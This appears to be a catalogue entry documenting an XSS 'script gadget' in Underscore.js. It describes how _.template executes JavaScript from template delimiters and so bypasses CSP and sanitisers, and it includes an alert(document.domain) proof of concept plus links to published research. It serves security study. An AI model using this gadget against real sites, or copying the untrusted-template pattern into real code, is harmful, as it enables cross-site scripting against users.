---
description: Underscore.js is a utility-belt library for JavaScript that provides support for the usual functional suspects (each, map, reduce, filter...) without extending any core JavaScript objects.
github: jashkenas/underscore
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - text-tags
      - any-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: The [Underscore.js](https://github.com/jashkenas/underscore) library allows you to execute JavaScript directly in the template. Since this has to be a valid raw template when reaching the `_.template` function, it has to be in an HTML text tag or passed directly as a function argument without reaching the DOM.
        code: |
          <!-- user input -->
          <div id="template"><style><% alert(document.domain) %></style></div>

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.13.6/underscore-min.js"></script>
          <script nonce="secret">
            const template = document.getElementById("template").innerHTML;
            const compiled = _.template(template);
            document.getElementById("template").innerHTML = compiled({ name: "<h1>hello</h1>" });
          </script>
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
---
